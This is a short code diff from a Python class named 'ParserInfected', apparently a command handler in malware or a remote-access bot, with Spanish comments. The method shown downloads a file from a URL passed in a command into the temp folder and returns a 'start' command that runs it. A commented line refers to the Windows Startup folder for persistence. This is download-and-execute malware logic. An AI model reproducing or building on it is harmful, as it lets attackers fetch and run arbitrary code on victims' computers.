@@ -16,7 +16,8 @@ class ParserInfected:
         #Descargar
         url = listOfParameters[1]
         #path = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" PASARLO a VBS
-        urllib.request.urlretrieve (url,  tempfile.gettempdir()+"/" + listOfParameters[2])
+        local_filename, headers = urllib.request.urlretrieve (url,  tempfile.gettempdir()+"/" + listOfParameters[2])
+        
         #Ejecutar
         return "start "+ tempfile.gettempdir() +"/"+ listOfParameters[2], not listOfParameters[3].startswith("T")
         
